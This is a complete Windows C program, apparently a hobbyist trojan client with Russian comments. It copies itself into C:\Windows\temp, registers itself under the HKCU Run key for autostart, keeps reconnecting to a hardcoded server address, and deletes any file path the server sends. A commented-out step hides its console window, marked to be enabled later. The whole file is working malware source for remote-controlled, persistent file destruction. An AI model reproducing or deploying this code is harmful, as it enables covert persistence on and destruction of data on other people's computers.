#define _CRT_SECURE_NO_WARNINGS      
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>     // вместо dos.h и winreg.h
#pragma comment(lib, "ws2_32.lib")
#define Error -1
#define Port 1234       
#define IP "127.0.0.1"   // localhost - работает через проброс портов

// Функция добавления программы в автозагрузку и копирования в системную папку
int Autorun() {
    DWORD Path = 0;
    TCHAR IpFilename[MAX_PATH] = { 0 };
    HKEY hKey;

    if ((Path = GetModuleFileName(NULL, IpFilename, MAX_PATH)) == 0){
        printf("Error getting the path\n");
        return EXIT_FAILURE;
    }
    
    // Создаем папку temp если её нет
    CreateDirectory(L"C:\\Windows\\temp", NULL);
    
    // Копируем себя в C:\Windows\temp\Client.exe
    if (!CopyFile(IpFilename, L"C:\\Windows\\temp\\Client.exe", 0)) {
        printf("Error copying file (may need admin rights)\n");
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS){
        printf("Error opening registry key\n");
        RegCloseKey(hKey);
        return EXIT_FAILURE;
    }

    if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, 
        (const BYTE*)L"C:\\Windows\\temp\\Client.exe", 
        sizeof(L"C:\\Windows\\temp\\Client.exe") * 2) != ERROR_SUCCESS) {
        printf("Error when creating a parameter\n");
        RegCloseKey(hKey);
        return EXIT_FAILURE;
    }
    
    RegCloseKey(hKey);
    printf("Autorun configured successfully!\n");
    return EXIT_SUCCESS;
}

int main() {
    // Пытаемся прописать себя в автозагрузку
    Autorun();
    
    // Не скрываем окно сразу, чтобы увидеть ошибки (раскомментируйте позже)
    // HWND HWnd = GetConsoleWindow();
    // ShowWindow(HWnd, SW_HIDE);

    WSADATA Ws;
    char FileName[100] = { 0 };
    char DeletionError[50] = "Deletion error";
    char Successful[50] = "The deletion was successful";

    if (WSAStartup(MAKEWORD(2, 2), &Ws)) {
        printf("Error WinSock version initializaion\n");
        system("pause");
        return EXIT_FAILURE;
    }

    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (Socket == INVALID_SOCKET) {
        printf("Error initialization socket\n");
        system("pause");
        return EXIT_FAILURE;
    }

    SOCKADDR_IN SockAddr;
    memset(&SockAddr, 0, sizeof(SockAddr));
    SockAddr.sin_family = AF_INET;
    SockAddr.sin_port = htons(Port);
    SockAddr.sin_addr.s_addr = inet_addr(IP);

    printf("Trying to connect to %s:%d...\n", IP, Port);
    
    // Бесконечная попытка подключения
    while (connect(Socket, (struct sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
        printf("Connection failed, retrying...\n");
        Sleep(3000);
    }
    
    printf("Connected to server!\n");

    while (1) { 
        memset(FileName, 0, sizeof(FileName));
        recv(Socket, FileName, sizeof(FileName), 0);
        
        if (strcmp(FileName, "Exit") == 0) {
            printf("Exit command received\n");
            break;
        }
        
        printf("Attempting to delete: %s\n", FileName);
        
        if (remove(FileName) != 0) {
            printf("Failed to delete: %s\n", FileName);
            send(Socket, DeletionError, sizeof(DeletionError), 0);
        } else {
            printf("Successfully deleted: %s\n", FileName);
            send(Socket, Successful, sizeof(Successful), 0);
        }
    }
    
    closesocket(Socket);
    printf("Client shutting down...\n");
    system("pause");
    return EXIT_SUCCESS;
}